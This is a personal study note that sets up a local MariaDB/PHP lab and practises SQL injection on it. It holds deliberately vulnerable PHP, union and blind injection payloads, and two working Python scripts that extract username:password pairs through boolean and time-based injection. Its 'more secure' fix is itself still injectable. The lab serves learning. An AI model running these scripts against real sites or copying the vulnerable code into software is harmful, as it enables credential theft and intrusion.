# Definition
Something to do.
## Instalation and Initialization
```shell
# install services
sudo apt install mariadb-server apache2 php-mysql
# start services
service mysql start
service apache2 start
```
----
## Basics
```mysql
# show databases
show databases;
# sse a database.
use mysql;
# show tables into **mysql** database.
show tables;
# describe a scpecific table.
describe <tabale_name>;
# show table rows by specifying columns.
select user, password from user;
# using condiftional to match rows whith a specific paremetter.
select user, password from user where user = 'root';
select user, password from user where password = 'awdafa';
```
----
## Creating and Managing Database
Creating source to work in mysql CLI.
```mysql
create database cxnsxledb;
use cxnsxledb;
-- This output is empty
show tables;
create table users(id int(32), username varchar(32), password varchar(32));
-- Inserting data into table
insert into users values(1, 'admin', 'admin123@!AV');
insert into users values(1, 'cxnsxle', 'cxnsxle123321');
insert into users values(3, 'omar', 'omarElYaker');
-- Updating a table
update users set id=2 where username='cxnsxle';
-- Show rows
select * from users;
```
----
Create and grant privileges to manage queries.
```shell
create user 'cxnsxle'@'localhost' identified by 'cxnsxle0206';
gran all privileges on cxnsxledb.* to 'cxnsxle'@'localhost';
```
----
# Injections
Connection to database using *searchUsers.php* like some real web sites.
## Error-Based SQL Injection
Show syntax error -> SQLI Error based.
```php
<?php
	// credentials needed to connect to database
	$server = "localhost";
	$username = "cxnsxle";
	$password = "cxnsxle0206";
	$database = "cxnsxledb";

	// control connection to database
	$conn = new mysqli($server, $username, $password, $database);

	$id = $_GET['id'];

	// retrieving data from database and managing syntax query error
	$data = mysqli_query($conn, "select username from users where id='$id'") or die(mysqli_error($conn));
	// formatting query response
	$response = mysqli_fetch_array($data);
	echo $response['username'];
?>
```
----
### Detecting number of columns
Comment query to interpret the end of the query witih *#* or *--*.
Queries:
```mysql
select username from users where id = '3' order by 100;-- -';
-- using union to see database data
select username from users where id = '1' union select 1;-- -';
-- see database name
select username from users where id = '1' union select database();-- -';
```
---
### Making web more secure
Modifying *searchUsers.php* by scaping some special characters.
This is silent because you can't see anything.
```php
<?php
	// credentials needed to connect to database
	$server = "localhost";
	$username = "cxnsxle";
	$password = "cxnsxle0206";
	$database = "cxnsxledb";

	// control connection to database
	$conn = new mysqli($server, $username, $password, $database);

	// enabling scaping feature
	$id = mysqli_real_escape_string($conn, $_GET['id']);

	// retrieving data from database
	$data = mysqli_query($conn, "select username from users where id=$id");
	// formatting query response
	$response = mysqli_fetch_array($data);

	// verifying response content in the 'username' column
	if (!isset($response['username'])) {
		http_response_code(404);
	}
?>
```
----
See status code sending mysql queries.
-I -> To fecth the headers only.
```shell
# Returns 202 OK
curl -s -I -X GET "http://localhost/searchUsers2.php?id=1"
# Returns 404 Not Found
curl -s -I -X GET "http://localhost/searchUsers2.php?id=5"
```
----
## Boolean-Based Blind SQL Injection
Playing SQLI without seeing any log by using CONDITIONS.
Using a web to practice this SQLI type [extendsclass](https://extendsclass.com/mysql-online.html)
```mysql
-- returns -> 1 (true)
select(select substring(username,1,1) from users where id=1)='a';
-- returns -> 0 (false)
select(select substring(username,1,1) from users where id=1)='b';
```
---
Working with HEX to avoid special characters
```mysql
-- returns -> 1 (true)
select(select ascii(substring(username,1,1)) from users where id=1)=97;
-- returns -> 0 (false)
select(select ascii(substring(username,1,1)) from users where id=1)=98;
```
---
Conditions
-G -> To sent data with GET request by using --data-urlencode
```shell
# Returns 202 OK
curl -s -I -X GET "http://localhost/searchUsers2.php" -G --data-urlencode "id=2"
# Returns 202 OK
curl -s -I -X GET "http://localhost/searchUsers2.php" -G --data-urlencode "id=2 or 1=1"
# Returns 404 Not Found
curl -s -I -X GET "http://localhost/searchUsers2.php" -G --data-urlencode "id=2 or 1=2"
```
----
### Nested Queries
Nested queries to inject boolean queries
```mysql
# Returns 202 OK
curl -s -I -X GET "http://localhost/searchUsers2.php" -G --data-urlencode "id=9 or (select(select ascii(substring(username,1,1)) from users where id=1)=97)"
# Returns 404 Not Found
curl -s -I -X GET "http://localhost/searchUsers2.php" -G --data-urlencode "id=9 or (select(select ascii(substring(username,1,1)) from users where id=1)=98)"
```
----
### Using Python Scripting
Install pwn to use progress bars and more.
```shell
sudo pip install pwn
```
Script to retrieve database data by using boolean injection and ascii numbers to match characters.
```python
#!/usr/bin/python3
import requests
from pwn import *
import signal
import sys
import time

# manage force stop
def def_handler(sig, frame):
    print('\n[!] Exiting...\n')
    sys.exit(1)

def makeSQLI():
    # show progess
    progress_bar_1 = log.progress('BRUTE FORCE')
    progress_bar_1.status('Starting brute force')
    time.sleep(2)
    progress_bar_2 = log.progress('Extracted data')

    # extracted data
    matchedString = ''
    for word_position in range(1, 100):
        for character in range(33, 127):
            # construct url injection
            #sqli_url = main_url + '?' + 'id=9 or (select(select ascii(substring(username,%d,1)) from users where id=1)=%d)' % (word_position, character)
            # retrieve usernames by using nested queries
            #sqli_url = main_url + '?' + 'id=9 or (select(select ascii(substring((select group_concat(username) from users),%d,1)) from users where id=1)=%d)' % (word_position, character)
            # retrieve schema names by using nested queries
            #sqli_url = main_url + '?' + 'id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id=1)=%d)' % (word_position, character)
            # retrieve usernames and password separated by ':' by using nested queries
            sqli_url = main_url + '?' + 'id=9 or (select(select ascii(substring((select group_concat(username, 0x3a, password) from users),%d,1)) from users where id=1)=%d)' % (word_position, character)

            progress_bar_1.status(sqli_url)

            # verify status code
            r = requests.get(sqli_url)
            if r.status_code == 200:
                matchedString += chr(character)
                progress_bar_2.status(matchedString)
                break

# ctrl+c
signal.signal(signal.SIGINT, def_handler)

# global variables
main_url = "http://localhost/searchUsers2.php"
characters = string.printable

if __name__ == '__main__':
    makeSQLI()
```
----
### Time-Based
Playing SQLI without seeing any log by using TIME conditions.
```mysql
-- returns -> All usernames
select username from users where id=1 and if(ascii(substring(database(),1,1))=100,sleep(5),0);
-- returns -> Sleep of 5 seconds
select username from users where id=1 and if(ascii(substring(database(),1,1))=99,sleep(5),0);
```
----
Script to retrieve database data by using boolean TIME injection and ascii numbers to match characters.
```python
#!/usr/bin/python3
import requests
from pwn import *
import signal
import sys
import time

# manage force stop
def def_handler(sig, frame):
    print('\n[!] Exiting...\n')
    sys.exit(1)

def makeSQLI():
    # show progess
    progress_bar_1 = log.progress('BRUTE FORCE')
    progress_bar_1.status('Starting brute force')
    time.sleep(2)
    progress_bar_2 = log.progress('Extracted data')

    # extracted data
    matchedString = ''
    for word_position in range(1, 100):
        for character in range(33, 127):
            # construct url injection
            # retrieve database name
            #sqli_url = main_url + '?' + 'id=1 and if(ascii(substring(database(),%d,1))=%d,sleep(0.35),0)' % (word_position, character)
            # retrieve username and password by using group_concat()
            sqli_url = main_url + '?' + 'id=1 and if(ascii(substring((select group_concat(username, 0x3a, password) from users),%d,1))=%d,sleep(0.35),0)' % (word_position, character)

            progress_bar_1.status(sqli_url)

            # capture query time
            time_start = time.time()
            r = requests.get(sqli_url)
            time_end = time.time()

            # verifying status code
            if time_end - time_start >= 0.35:
                matchedString += chr(character)
                progress_bar_2.status(matchedString)
                break

# ctrl+c
signal.signal(signal.SIGINT, def_handler)

# global variables
main_url = "http://localhost/searchUsers2.php"
characters = string.printable

if __name__ == '__main__':
    makeSQLI()
```
----